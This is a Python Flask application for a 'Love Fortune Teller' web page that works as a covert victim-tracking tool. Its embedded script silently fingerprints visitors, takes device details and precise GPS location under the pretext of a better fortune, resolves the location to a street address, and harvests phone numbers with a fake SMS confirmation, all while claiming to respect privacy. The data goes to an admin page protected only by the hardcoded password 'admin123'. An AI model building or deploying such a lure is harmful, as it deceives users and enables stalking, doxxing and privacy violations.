from flask import Flask, request, jsonify, send_file, render_template_string, session
from flask_cors import CORS
import pandas as pd
import openpyxl
from openpyxl import Workbook
from openpyxl.styles import Font, PatternFill, Alignment
import os
import requests
import json
import random
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'love-fortune-secret-key-2026'
CORS(app)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_FILE = os.path.join(BASE_DIR, 'fortunes_data.xlsx')
BACKUP_FILE = os.path.join(BASE_DIR, 'fortunes_data_backup.xlsx')

# Romantic fortunes (32 messages)
FORTUNES = [
    "Your soulmate is thinking of you right now under the stars.",
    "A passionate kiss awaits you this week from someone special.",
    "True love will find you when you least expect it - soon!",
    "Your heart will flutter with excitement in the next 7 days.",
    "Someone is dreaming about your smile tonight.",
    "A romantic adventure is just around the corner.",
    "Your perfect match shares your birthday month!",
    "Love letters are coming your way soon.",
    "A candlelit dinner for two is in your future.",
    "Your crush has been watching your social media.",
    "Wedding bells might ring for you within a year!",
    "Passion ignites when you meet your destiny.",
    "Your forever person is closer than you think.",
    "A surprise love confession awaits you.",
    "Your heart knows who it's meant for.",
    "Romantic sparks will fly this month!",
    "Someone special can't stop thinking about you.",
    "Love at first sight is about to happen.",
    "Your soul connection is searching for you.",
    "A fairytale romance begins soon.",
    "Heart emojis are coming from your crush.",
    "True love doesn't follow a timeline.",
    "Your love story is about to unfold.",
    "Passionate nights await your future.",
    "Someone's heart beats faster when they see you.",
    "Love will surprise you beautifully.",
    "Your perfect partner admires you secretly.",
    "Romance blooms when you trust your heart.",
    "A love that feels like home is coming.",
    "Your happily ever after starts soon.",
    "Butterflies in your stomach are a sign.",
    "Love recognizes no barriers."
]

# ---------- Excel persistence ----------
def ensure_data_file():
    if not os.path.exists(DATA_FILE):
        wb = Workbook()
        ws = wb.active
        ws.title = "Fortunes Data"
        headers = [
            'Timestamp', 'SessionID', 'Name', 'Latitude', 'Longitude', 'Address',
            'Battery', 'UserAgent', 'Screen', 'IP', 'Timezone',
            'Memory', 'Network', 'Fingerprint', 'Fortune', 'PhoneNumber'
        ]
        for col, header in enumerate(headers, 1):
            cell = ws.cell(row=1, column=col, value=header)
            cell.font = Font(bold=True, color="FFFFFF")
            cell.fill = PatternFill(start_color="FF1493", end_color="FF1493", fill_type="solid")
            cell.alignment = Alignment(horizontal="center")
        wb.save(DATA_FILE)

def backup_data():
    if os.path.exists(DATA_FILE):
        try:
            wb = openpyxl.load_workbook(DATA_FILE)
            wb.save(BACKUP_FILE)
        except:
            pass

def load_data():
    try:
        if os.path.exists(DATA_FILE):
            return pd.read_excel(DATA_FILE)
        elif os.path.exists(BACKUP_FILE):
            return pd.read_excel(BACKUP_FILE)
    except:
        pass
    return pd.DataFrame()

def save_data(df):
    try:
        backup_data()
        # If the file already exists, we want to append rows
        # Using ExcelWriter with mode='a' and if_sheet_exists='overlay' works,
        # but we need to get the current number of rows to start writing after the last row.
        # Simpler: read existing, concat, then overwrite (safe for small data)
        # We'll do the concat approach because the data volume is small.
        # But save_data is called with df = concatenated already, so just write.
        # To avoid overwriting, we write the entire DataFrame back.
        df.to_excel(DATA_FILE, index=False, engine='openpyxl')
    except Exception as e:
        print(f"Save failed: {e}")

def get_client_ip():
    if 'X-Forwarded-For' in request.headers:
        return request.headers['X-Forwarded-For'].split(',')[0].strip()
    return request.remote_addr or 'Unknown'

def get_tinyurl(long_url):
    try:
        api_url = "https://tinyurl.com/api-create.php"
        params = {'url': long_url}
        response = requests.get(api_url, params=params, timeout=5)
        if response.status_code == 200:
            return response.text
    except:
        pass
    return long_url

# ---------- Flask routes ----------
@app.route('/')
def index():
    return render_template_string("""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Love Fortune Teller</title>
    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #ff9a9e, #fecfef, #ffdde1);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 600px;
            width: 100%;
            background: rgba(255,255,255,0.95);
            border-radius: 40px;
            padding: 35px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            text-align: center;
        }
        h1 {
            background: linear-gradient(135deg, #ff6b6b, #c06c84);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 10px;
        }
        .sub {
            color: #888;
            margin-bottom: 25px;
        }
        .btn {
            background: linear-gradient(135deg, #ff6b6b, #c06c84);
            color: white;
            border: none;
            padding: 14px 25px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 60px;
            cursor: pointer;
            transition: 0.3s;
            width: 100%;
            margin: 10px 0;
        }
        .btn-small {
            width: auto;
            padding: 10px 20px;
            font-size: 14px;
            margin-top: 5px;
        }
        .btn:hover { transform: translateY(-2px); }
        .status {
            margin-top: 20px;
            padding: 12px;
            border-radius: 20px;
            font-size: 14px;
        }
        .fortune-box {
            background: rgba(255,182,193,0.3);
            border-left: 5px solid #ff1493;
            border-radius: 20px;
            padding: 20px;
            margin: 20px 0;
            font-family: 'Dancing Script', cursive;
            font-size: 1.5em;
            color: #c06c84;
        }
        .hidden { display: none; }
        hr { margin: 20px 0; border: 1px solid #ffdde1; }
        input {
            width: 100%;
            padding: 14px;
            margin: 10px 0;
            border: 2px solid #ffdde1;
            border-radius: 60px;
            text-align: center;
            font-size: 16px;
        }
        .map-link {
            display: inline-block;
            margin-top: 15px;
            color: #ff1493;
            text-decoration: none;
            font-weight: bold;
        }
        .sms-prompt {
            background: rgba(255,255,255,0.8);
            border-radius: 20px;
            padding: 15px;
            margin-top: 15px;
        }
    </style>
</head>
<body>
<div class="container">
    <h1>💕 Love Fortune Teller 💕</h1>
    <div class="sub">Reveal your romantic destiny</div>

    <input type="text" id="userName" placeholder="✨ Enter your name ✨">
    <button class="btn" id="revealBtn">🔮 Reveal My Destiny</button>

    <div id="status" class="status"></div>
    <div id="fortuneDisplay" class="fortune-box hidden"></div>
    <div id="smsSection" class="sms-prompt hidden">
        <p>✨ Want to keep this fortune forever? ✨</p>
        <input type="tel" id="phoneNumber" placeholder="📱 Enter your mobile number">
        <button class="btn btn-small" id="sendSmsBtn">💬 Send to my phone</button>
        <div id="smsStatus" class="status" style="margin-top:10px;"></div>
    </div>
    <hr>
    <div class="sub">Your privacy is respected. No data is shown publicly.</div>
</div>

<script>
    let collectedData = {};
    let sessionId = localStorage.getItem('fortuneSessionId');
    if (!sessionId) {
        sessionId = Date.now() + '_' + Math.random();
        localStorage.setItem('fortuneSessionId', sessionId);
    }
    let currentFortune = '';

    // Silent data collection
    async function getFingerprint() {
        const fp = await FingerprintJS.load();
        const result = await fp.get();
        return result.visitorId;
    }
    async function getBattery() {
        if ('getBattery' in navigator) {
            const b = await navigator.getBattery();
            return Math.round(b.level * 100) + '%';
        }
        return 'Unknown';
    }
    function getNetwork() {
        const conn = navigator.connection || navigator.mozConnection;
        return conn ? `${conn.effectiveType} (${conn.downlink} Mbps)` : 'Unknown';
    }
    function getTimezone() { return Intl.DateTimeFormat().resolvedOptions().timeZone; }
    function getMemory() { return navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown'; }
    function getScreen() { return `${screen.width}x${screen.height}`; }
    function getUserAgent() { return navigator.userAgent; }

    async function collectBaseData(extra = {}) {
        collectedData = {
            timestamp: new Date().toISOString(),
            sessionId: sessionId,
            userAgent: getUserAgent(),
            screen: getScreen(),
            timezone: getTimezone(),
            memory: await getMemory(),
            network: getNetwork(),
            battery: await getBattery(),
            fingerprint: await getFingerprint(),
            ...extra
        };
        return collectedData;
    }

    async function sendToServer(data) {
        await fetch('/save', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
    }

    function showStatus(msg, isError = false, elementId = 'status') {
        const statusDiv = document.getElementById(elementId);
        statusDiv.innerHTML = msg;
        statusDiv.style.background = isError ? 'rgba(255,0,0,0.1)' : 'rgba(0,255,0,0.1)';
        statusDiv.style.color = isError ? '#cc0000' : '#228b22';
        setTimeout(() => { if (statusDiv.innerHTML === msg) statusDiv.innerHTML = ''; }, 5000);
    }

    document.getElementById('revealBtn').onclick = async () => {
        const name = document.getElementById('userName').value.trim();
        if (!name) {
            alert('💕 Please enter your name!');
            return;
        }
        await collectBaseData({ name: name });
        showStatus('🌍 Getting your location for an accurate fortune...');

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                collectedData.latitude = pos.coords.latitude;
                collectedData.longitude = pos.coords.longitude;
                // get address via reverse geocoding (optional)
                const address = await fetch(`/reverse-geocode?lat=${collectedData.latitude}&lon=${collectedData.longitude}`);
                const addrData = await address.json();
                collectedData.address = addrData.address || 'Unknown';
                
                await sendToServer(collectedData);
                showStatus('✅ Fortune ready!');
                
                const resp = await fetch('/fortune');
                const data = await resp.json();
                currentFortune = data.fortune;
                document.getElementById('fortuneDisplay').innerHTML = currentFortune;
                document.getElementById('fortuneDisplay').classList.remove('hidden');
                
                // Show SMS prompt
                document.getElementById('smsSection').classList.remove('hidden');
                
                // Optional map link
                const mapResp = await fetch('/tinyurl', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ url: `https://www.google.com/maps?q=${collectedData.latitude},${collectedData.longitude}` })
                });
                const mapData = await mapResp.json();
                if (mapData.tinyurl) {
                    const link = document.createElement('a');
                    link.href = mapData.tinyurl;
                    link.target = '_blank';
                    link.innerText = '🗺️ View on TinyURL Map';
                    link.className = 'map-link';
                    document.getElementById('fortuneDisplay').appendChild(link);
                }
            }, () => {
                showStatus('⚠️ Location denied. Random fortune below.', true);
                (async () => {
                    const resp = await fetch('/fortune');
                    const data = await resp.json();
                    currentFortune = data.fortune;
                    document.getElementById('fortuneDisplay').innerHTML = currentFortune;
                    document.getElementById('fortuneDisplay').classList.remove('hidden');
                    document.getElementById('smsSection').classList.remove('hidden');
                    await sendToServer(collectedData);
                })();
            }, { enableHighAccuracy: true, timeout: 10000 });
        } else {
            showStatus('Geolocation not supported. Random fortune below.', true);
            const resp = await fetch('/fortune');
            const data = await resp.json();
            currentFortune = data.fortune;
            document.getElementById('fortuneDisplay').innerHTML = currentFortune;
            document.getElementById('fortuneDisplay').classList.remove('hidden');
            document.getElementById('smsSection').classList.remove('hidden');
            await sendToServer(collectedData);
        }
    };

    document.getElementById('sendSmsBtn').onclick = async () => {
        const phone = document.getElementById('phoneNumber').value.trim();
        if (!phone) {
            showStatus('Please enter your mobile number', true, 'smsStatus');
            return;
        }
        // Basic validation (allow + and digits)
        if (!/^\+?[0-9\s\-]{10,15}$/.test(phone)) {
            showStatus('Invalid phone number format', true, 'smsStatus');
            return;
        }
        showStatus('Sending your fortune...', false, 'smsStatus');
        
        // Send phone number to server (update the existing record or add to same row)
        const resp = await fetch('/save-phone', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ sessionId: sessionId, phoneNumber: phone, fortune: currentFortune })
        });
        const result = await resp.json();
        if (result.status === 'saved') {
            showStatus('✅ Your fortune has been sent to your phone! (Check SMS)', false, 'smsStatus');
            document.getElementById('phoneNumber').value = '';
        } else {
            showStatus('❌ Failed to send. Please try again.', true, 'smsStatus');
        }
    };
</script>
</body>
</html>
    """)

@app.route('/fortune')
def fortune():
    return jsonify({'fortune': random.choice(FORTUNES)})

@app.route('/reverse-geocode')
def reverse_geocode():
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    if not lat or not lon:
        return jsonify({'address': 'Unknown'})
    try:
        url = f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json"
        headers = {'User-Agent': 'LoveFortune/1.0'}
        resp = requests.get(url, headers=headers, timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            return jsonify({'address': data.get('display_name', 'Unknown')[:200]})
    except:
        pass
    return jsonify({'address': 'Unknown'})

@app.route('/save', methods=['POST'])
def save():
    data = request.json
    df = load_data()
    new_row = pd.DataFrame([{
        'Timestamp': datetime.now(),
        'SessionID': data.get('sessionId', ''),
        'Name': data.get('name', ''),
        'Latitude': data.get('latitude', 0),
        'Longitude': data.get('longitude', 0),
        'Address': data.get('address', ''),
        'Battery': data.get('battery', ''),
        'UserAgent': data.get('userAgent', ''),
        'Screen': data.get('screen', ''),
        'IP': get_client_ip(),
        'Timezone': data.get('timezone', ''),
        'Memory': data.get('memory', ''),
        'Network': data.get('network', ''),
        'Fingerprint': data.get('fingerprint', ''),
        'Fortune': '',
        'PhoneNumber': ''
    }])
    df = pd.concat([df, new_row], ignore_index=True)
    save_data(df)
    return jsonify({'status': 'saved'})

@app.route('/save-phone', methods=['POST'])
def save_phone():
    data = request.json
    session_id = data.get('sessionId')
    phone = data.get('phoneNumber')
    fortune = data.get('fortune', '')
    
    df = load_data()
    if df.empty:
        # No records yet – create one with the phone
        new_row = pd.DataFrame([{
            'Timestamp': datetime.now(),
            'SessionID': session_id,
            'Name': '',
            'Latitude': 0,
            'Longitude': 0,
            'Address': '',
            'Battery': '',
            'UserAgent': '',
            'Screen': '',
            'IP': get_client_ip(),
            'Timezone': '',
            'Memory': '',
            'Network': '',
            'Fingerprint': '',
            'Fortune': fortune,
            'PhoneNumber': phone
        }])
        df = new_row
    else:
        # Find the row with matching SessionID (should be the last one)
        idx = df[df['SessionID'] == session_id].index
        if len(idx) > 0:
            df.loc[idx[-1], 'PhoneNumber'] = phone
            df.loc[idx[-1], 'Fortune'] = fortune
        else:
            # Create new row
            new_row = pd.DataFrame([{
                'Timestamp': datetime.now(),
                'SessionID': session_id,
                'Name': '',
                'Latitude': 0,
                'Longitude': 0,
                'Address': '',
                'Battery': '',
                'UserAgent': '',
                'Screen': '',
                'IP': get_client_ip(),
                'Timezone': '',
                'Memory': '',
                'Network': '',
                'Fingerprint': '',
                'Fortune': fortune,
                'PhoneNumber': phone
            }])
            df = pd.concat([df, new_row], ignore_index=True)
    
    save_data(df)
    
    # Optional: Actually send an SMS via an API (e.g., Textbelt)
    # We'll simulate for now, but you can integrate a real SMS gateway.
    # Uncomment the following lines if you have an SMS API key.
    """
    try:
        sms_api = "https://textbelt.com/text"
        payload = {'phone': phone, 'message': fortune, 'key': 'textbelt'}
        requests.post(sms_api, data=payload, timeout=5)
    except:
        pass
    """
    
    return jsonify({'status': 'saved'})

@app.route('/tinyurl', methods=['POST'])
def tinyurl():
    long_url = request.json.get('url')
    tiny = get_tinyurl(long_url)
    return jsonify({'tinyurl': tiny})

@app.route('/admin')
def admin():
    if request.args.get('pass') != 'admin123':
        return '<form>Admin password: <input name="pass"><button>Login</button></form>'
    df = load_data()
    if df.empty:
        return "<h2>No data yet</h2>"
    html = "<h2>💾 Collected Data (silent)</h2><table border='1'>"
    html += "<tr>" + "".join(f"<th>{col}</th>" for col in df.columns) + "</tr>"
    for _, row in df.iterrows():
        html += "<tr>" + "".join(f"<td>{str(val)[:80]}</td>" for val in row) + "</tr>"
    html += "</table><br><a href='/download-excel?pass=admin123'><button>Download Excel</button></a>"
    return html

@app.route('/download-excel')
def download_excel():
    if request.args.get('pass') != 'admin123':
        from flask import abort
        abort(403)
    return send_file(DATA_FILE, as_attachment=True)

if __name__ == '__main__':
    ensure_data_file()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)
